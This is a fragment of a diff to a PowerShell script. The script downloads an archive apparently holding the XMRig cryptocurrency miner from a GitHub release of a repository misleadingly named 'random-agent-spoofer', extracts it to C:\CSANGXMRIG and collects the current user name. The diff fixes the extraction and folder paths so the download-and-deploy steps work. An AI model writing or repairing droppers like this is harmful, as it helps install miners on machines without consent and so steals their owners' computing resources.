@@ -3,9 +3,9 @@ $url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/C
 Invoke-WebRequest -Uri $url -OutFile "$downloadPath\CSANGXMRIG.zip"
 
 $destinationPath = "C:\CSANGXMRIG" 
-Expand-Archive -Path $downloadPath -DestinationPath $destinationPath -Force
+Expand-Archive -Path "$downloadPath\CSANGXMRIG.zip" -DestinationPath $destinationPath -Force
 Start-Sleep -Seconds 2
-Set-Location -Path "C:\AutoRclone-master"
+Set-Location -Path "C:\CSANGXMRIG\"
 $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $userName = $userName -replace "^.*\\", ""
 $folderPath = "C:\CSANGXMRIG\"
